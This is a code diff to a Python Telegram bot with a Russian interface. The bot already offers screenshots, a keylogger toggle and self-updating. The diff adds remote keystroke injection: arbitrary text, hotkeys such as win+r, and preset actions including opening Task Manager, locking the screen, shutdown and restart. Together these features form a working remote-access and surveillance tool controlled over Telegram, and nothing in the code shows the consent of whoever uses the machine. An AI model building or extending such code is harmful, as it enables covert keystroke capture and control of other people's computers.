@@ -15,6 +15,7 @@ from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, Messa
 
 from keylogger import keylogger
 from updater import updater
+from key_sender import key_sender, PRESET_COMMANDS
 
 
 logging.basicConfig(
@@ -41,6 +42,7 @@ def build_main_keyboard() -> ReplyKeyboardMarkup:
     keyboard = [
         [KeyboardButton(text="📸 Скриншот")],
         [KeyboardButton(text="⌨️ Кейлоггер ВКЛ"), KeyboardButton(text="⌨️ Кейлоггер ВЫКЛ")],
+        [KeyboardButton(text="⌨️ Отправить клавиши"), KeyboardButton(text="🎮 Команды")],
         [KeyboardButton(text="🔄 Проверить обновления"), KeyboardButton(text="⬆️ Обновить")],
     ]
     return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True, one_time_keyboard=False)
@@ -60,6 +62,8 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             "Доступные действия:\n"
             "• 📸 Скриншот — снимок экрана\n"
             "• ⌨️ Кейлоггер ВКЛ/ВЫКЛ — захват клавиш\n"
+            "• ⌨️ Отправить клавиши — эмуляция нажатий\n"
+            "• 🎮 Команды — предустановленные действия\n"
             "• 🔄 Проверить обновления — проверить новые версии\n"
             "• ⬆️ Обновить — скачать и установить обновление"
         ),
@@ -148,6 +152,106 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
         except Exception as error:
             logger.exception("Ошибка при обновлении")
             await update.message.reply_text(f"Ошибка при обновлении: {error}")
+        return
+    
+    elif text == "⌨️ Отправить клавиши":
+        await update.message.reply_text(
+            "⌨️ <b>Отправка клавиш</b>\n\n"
+            "Отправь текст или команду:\n"
+            "• <code>текст</code> — отправить текст\n"
+            "• <code>enter</code> — нажать Enter\n"
+            "• <code>ctrl+c</code> — комбинация Ctrl+C\n"
+            "• <code>win+r</code> — комбинация Win+R\n"
+            "• <code>f5</code> — нажать F5\n\n"
+            "Примеры:\n"
+            "<code>Привет мир!</code>\n"
+            "<code>ctrl+a</code>\n"
+            "<code>win+d</code>",
+            parse_mode=ParseMode.HTML,
+        )
+        return
+    
+    elif text == "🎮 Команды":
+        commands_text = "🎮 <b>Предустановленные команды:</b>\n\n"
+        for cmd, desc in [
+            ("notepad", "Открыть Блокнот"),
+            ("calculator", "Открыть Калькулятор"),
+            ("task_manager", "Диспетчер задач"),
+            ("desktop", "Показать рабочий стол"),
+            ("alt_tab", "Переключить окно"),
+            ("copy", "Копировать"),
+            ("paste", "Вставить"),
+            ("save", "Сохранить"),
+            ("refresh", "Обновить"),
+            ("screenshot", "Скриншот области"),
+            ("lock_screen", "Заблокировать экран"),
+            ("shutdown", "Выключить ПК"),
+            ("restart", "Перезагрузить ПК"),
+            ("sleep", "Режим сна"),
+        ]:
+            commands_text += f"• <code>{cmd}</code> — {desc}\n"
+        
+        commands_text += "\nОтправь название команды для выполнения."
+        await update.message.reply_text(commands_text, parse_mode=ParseMode.HTML)
+        return
+    
+    # Обработка текстовых команд для эмуляции клавиш
+    elif text.startswith("ctrl+") or text.startswith("alt+") or text.startswith("win+") or text.startswith("shift+"):
+        try:
+            # Парсим комбинацию клавиш
+            parts = text.lower().split("+")
+            if len(parts) == 2:
+                modifier, key = parts
+                success = key_sender.send_hotkey(modifier, key)
+                if success:
+                    await update.message.reply_text(f"✅ Отправлена комбинация: {text}")
+                else:
+                    await update.message.reply_text(f"❌ Ошибка отправки: {text}")
+            else:
+                await update.message.reply_text("❌ Неверный формат комбинации. Используйте: ctrl+c, alt+tab, win+r")
+        except Exception as error:
+            logger.exception("Ошибка при отправке комбинации")
+            await update.message.reply_text(f"Ошибка: {error}")
+        return
+    
+    # Проверяем, является ли текст предустановленной командой
+    elif text.lower() in PRESET_COMMANDS:
+        try:
+            command_sequence = PRESET_COMMANDS[text.lower()]
+            success = key_sender.send_sequence(command_sequence)
+            if success:
+                await update.message.reply_text(f"✅ Выполнена команда: {text}")
+            else:
+                await update.message.reply_text(f"❌ Ошибка выполнения команды: {text}")
+        except Exception as error:
+            logger.exception("Ошибка при выполнении команды")
+            await update.message.reply_text(f"Ошибка: {error}")
+        return
+    
+    # Обработка одиночных клавиш (enter, tab, f5, escape и т.д.)
+    elif text.lower() in ["enter", "tab", "space", "backspace", "delete", "escape", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12"]:
+        try:
+            success = key_sender.send_key(text.lower())
+            if success:
+                await update.message.reply_text(f"✅ Отправлена клавиша: {text}")
+            else:
+                await update.message.reply_text(f"❌ Ошибка отправки клавиши: {text}")
+        except Exception as error:
+            logger.exception("Ошибка при отправке клавиши")
+            await update.message.reply_text(f"Ошибка: {error}")
+        return
+    
+    # Обработка обычного текста
+    elif len(text) > 0 and not text.startswith("📸") and not text.startswith("⌨️") and not text.startswith("🔄") and not text.startswith("⬆️") and not text.startswith("🎮"):
+        try:
+            success = key_sender.send_text(text)
+            if success:
+                await update.message.reply_text(f"✅ Отправлен текст: {text[:50]}{'...' if len(text) > 50 else ''}")
+            else:
+                await update.message.reply_text(f"❌ Ошибка отправки текста")
+        except Exception as error:
+            logger.exception("Ошибка при отправке текста")
+            await update.message.reply_text(f"Ошибка: {error}")
         return
 
     await update.message.reply_text(
